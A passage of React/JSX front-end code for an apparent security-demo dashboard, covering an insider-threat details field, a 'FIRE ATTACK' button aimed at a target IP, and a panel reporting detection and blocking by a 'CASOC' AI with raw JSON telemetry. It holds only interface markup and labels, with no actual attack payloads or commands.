                {/* Insider Details Editor */}
                <div className="pt-3">
                  <label className="block text-xs font-mono text-gray-300 mb-1">
                    Insider Threat Execution Details:
                  </label>
                  <textarea
                    rows={3}
                    value={insiderDetails}
                    onChange={(e) => setInsiderDetails(e.target.value)}
                    className="w-full bg-[#131c2e] border border-white/15 rounded-lg p-2.5 text-xs font-mono text-purple-300 focus:outline-none focus:border-purple-500"
                  />
                </div>
              </div>
            )}

            {/* Fire Button */}
            <div className="pt-2">
              <button
                type="button"
                onClick={fireAttack}
                disabled={isFiring}
                className={`w-full py-3.5 px-6 rounded-xl font-bold text-sm flex items-center justify-center gap-2 transition-all shadow-xl ${
                  isFiring
                    ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40 cursor-wait'
                    : attackMode === 'external'
                    ? 'bg-gradient-to-r from-rose-600 to-red-600 hover:from-rose-500 hover:to-red-500 text-white shadow-rose-500/30'
                    : 'bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white shadow-purple-500/30'
                }`}
              >
                {isFiring ? (
                  <>
                    <Zap className="w-4 h-4 animate-spin text-amber-300" />
                    <span>Transmitting & Executing Exploit...</span>
                  </>
                ) : (
                  <>
                    <Send className="w-4 h-4 fill-current" />
                    <span>
                      FIRE {attackMode === 'external' ? 'EXTERNAL ATTACK' : 'INSIDER THREAT'} AT {targetIp}
                    </span>
                  </>
                )}
              </button>
            </div>
          </div>
        </div>

        {/* Right Column: Real-Time Execution Feedback & SOC Intercept (5 cols) */}
        <div className="lg:col-span-5 space-y-5">
          <div className="bg-[#0b101d] border border-white/10 rounded-xl p-5 space-y-4 shadow-lg h-full flex flex-col justify-between">
            <div>
              <div className="flex items-center justify-between pb-3 border-b border-white/10 mb-3">
                <span className="text-xs font-bold text-white uppercase tracking-wider flex items-center gap-2">
                  <Cpu className="w-4 h-4 text-cyan-400" />
                  CASOC Defense Intercept & Telemetry
                </span>
                {attackResult && (
                  <span className="text-xs font-mono font-bold text-cyan-400 flex items-center gap-1">
                    <Clock className="w-3.5 h-3.5" />
                    {attackResult.latencyMs} ms
                  </span>
                )}
              </div>

              {attackResult ? (
                <div className="space-y-3">
                  <div
                    className={`p-3.5 rounded-lg border flex items-center gap-3 ${
                      attackResult.success
                        ? 'bg-emerald-500/10 border-emerald-500/30'
                        : 'bg-rose-500/10 border-rose-500/30'
                    }`}
                  >
                    <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0" />
                    <div>
                      <div className="text-xs font-bold text-white">
                        {attackResult.success ? 'ATTACK INTERCEPTED BY CASOC AI' : 'ATTACK DISPATCH FAILED'}
                      </div>
                      <div className="text-[11px] text-gray-300 mt-0.5">
                        Target: <span className="font-mono text-cyan-300 font-bold">{attackResult.targetIp || attackResult.targetUsername}</span> | Vector: <span className="font-bold text-white">{attackResult.attackName}</span>
                      </div>
                    </div>
                  </div>

                  {/* Summary Badges */}
                  <div className="grid grid-cols-2 gap-2 text-xs font-mono">
                    <div className="p-2.5 rounded bg-black/40 border border-white/5">
                      <div className="text-[10px] text-gray-400 uppercase">Detection Classification</div>
                      <div className="text-rose-400 font-bold mt-0.5">MALICIOUS THREAT</div>
                    </div>
                    <div className="p-2.5 rounded bg-black/40 border border-white/5">
                      <div className="text-[10px] text-gray-400 uppercase">Autonomous Defense</div>
                      <div className="text-emerald-400 font-bold mt-0.5">ACTIVE BLOCKED</div>
                    </div>
                  </div>

                  {/* Raw Response Stream */}
                  <div>
                    <div className="text-[10px] font-mono uppercase tracking-wider text-gray-400 mb-1">
                      Raw JSON Response Returned:
                    </div>
                    <pre className="p-3 rounded-lg bg-black/60 border border-cyan-500/20 text-[11px] font-mono text-cyan-300 overflow-x-auto max-h-56">
                      {JSON.stringify(attackResult.response || attackResult.error, null, 2)}
                    </pre>
                  </div>
                </div>
              ) : (
                <div className="py-20 text-center text-gray-400 text-xs space-y-2">
                  <Crosshair className="w-10 h-10 mx-auto opacity-30 text-rose-400" />
                  <p className="font-semibold text-white">Ready to Execute Attack</p>
                  <p className="text-[11px] text-gray-400 max-w-xs mx-auto">
                    Choose an IP address or employee ID above and click "FIRE ATTACK" to see genuine AI detection in action.
                  </p>
                </div>
              )}
            </div>

            {/* Next Steps Links */}
            {attackResult && (
              <div className="pt-4 border-t border-white/10 space-y-2">
                <div className="text-[11px] font-mono text-gray-400 uppercase">VERIFY LIVE IMPACT:</div>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                  <Link
                    to="/admin-workspace"
                    className="p-2.5 rounded-lg bg-cyan-500/10 hover:bg-cyan-500/20 border border-cyan-500/30 text-cyan-300 text-xs font-bold flex items-center justify-between transition-colors"
                  >
                    <span>Inspect in Admin Vault</span>
                    <ExternalLink className="w-3.5 h-3.5" />
                  </Link>
                  <Link
                    to="/user-workspace"
                    className="p-2.5 rounded-lg bg-purple-500/10 hover:bg-purple-500/20 border border-purple-500/30 text-purple-300 text-xs font-bold flex items-center justify-between transition-colors"
                  >
                    <span>View User Workstation</span>
                    <ExternalLink className="w-3.5 h-3.5" />
                  </Link>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
